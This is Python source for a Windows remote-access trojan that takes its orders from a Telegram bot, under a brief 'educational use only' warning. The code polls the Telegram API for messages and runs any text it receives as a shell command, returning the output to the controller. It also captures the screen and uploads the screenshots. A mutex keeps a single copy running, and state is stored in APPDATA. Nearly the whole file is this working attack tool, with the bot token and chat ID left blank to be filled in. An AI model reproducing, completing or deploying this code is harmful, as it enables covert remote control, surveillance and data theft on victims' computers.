# WARNING: This code is for educational use only.
# Do not use it without proper authorization.

import os
import sys
import subprocess
import time
import requests
import ctypes
import logging
from PIL import ImageGrab

TOKEN = ""
CHAT_ID = ""
URL = f"https://api.telegram.org/bot{TOKEN}"


def check_single_instance():
    mutex = ctypes.windll.kernel32.CreateMutexW(None, False, "Global\\MyUniqueMutex")
    if ctypes.windll.kernel32.GetLastError() == 183:
        sys.exit(0)

def get_updates(offset=None):
    try:
        params = {'timeout': 100, 'offset': offset}
        return requests.get(URL + "/getUpdates", params=params).json()
    except:
        return {}

def send_message(text):
    try:
        requests.get(URL + "/sendMessage", params={'chat_id': CHAT_ID, 'text': text})
    except:
        pass

def send_file(file_path):
    try:
        with open(file_path, 'rb') as f:
            requests.post(URL + "/sendDocument", files={'document': f}, data={'chat_id': CHAT_ID})
    except:
        pass

def capture_screenshot():
    path = os.path.join(os.getenv('APPDATA'), 'screen.png')
    img = ImageGrab.grab()
    img.save(path)
    return path

def execute_command(command):
    try:
        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
        return output.decode()
    except subprocess.CalledProcessError as e:
        return e.output.decode()

def load_last_update_id():
    path = os.path.join(os.getenv('APPDATA'), 'update_id.txt')
    if os.path.exists(path):
        with open(path, 'r') as f:
            return int(f.read().strip())
    return None

def save_last_update_id(update_id):
    path = os.path.join(os.getenv('APPDATA'), 'update_id.txt')
    with open(path, 'w') as f:
        f.write(str(update_id))

def main():
    check_single_instance()
    send_message("✅ Client Started.")

    last_update_id = load_last_update_id()

    while True:
        updates = get_updates(last_update_id)
        if updates.get("result"):
            for item in updates["result"]:
                update_id = item["update_id"]
                message = item.get("message", {})
                if str(message.get("chat", {}).get("id")) != CHAT_ID:
                    continue

                command = message.get("text", "")
                if command:
                    if command.lower() == "/screenshot":
                        path = capture_screenshot()
                        if path:
                            send_file(path)
                            send_message("📸 Screenshot sent.")
                    else:
                        result = execute_command(command)
                        send_message(f"📄 Output:\n{result}")

                last_update_id = update_id + 1
                save_last_update_id(last_update_id)
        time.sleep(3)

if __name__ == "__main__":
    main()
